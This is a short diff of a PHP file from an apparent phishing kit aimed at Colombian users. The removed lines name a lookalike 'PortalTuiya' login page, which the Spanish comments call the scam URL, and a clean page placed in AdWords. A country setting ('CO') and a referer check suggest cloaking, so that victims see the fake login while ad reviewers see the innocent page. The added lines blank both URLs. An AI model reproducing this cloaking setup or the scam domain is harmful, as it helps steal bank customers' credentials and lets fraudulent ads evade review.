@@ -1,8 +1,8 @@
 <?php
 
-$urlscam = "https://www.tuiyaestracto.com.co/8461/PortalTuiya/login.php"; //url de el scam
+$urlscam = ""; //url de el scam
 
-$urlreal = "https://www.tuiyaestracto.com.co/8461/PortalTuiya/default.html"; //url que se coloca en adwords
+$urlreal = ""; //url que se coloca en adwords
 
 $nacionalidad = "CO";
 $referer  = ($_SERVER["HTTP_REFERER"] == "") ? "<br>NADA" : $_SERVER["HTTP_REFERER"];
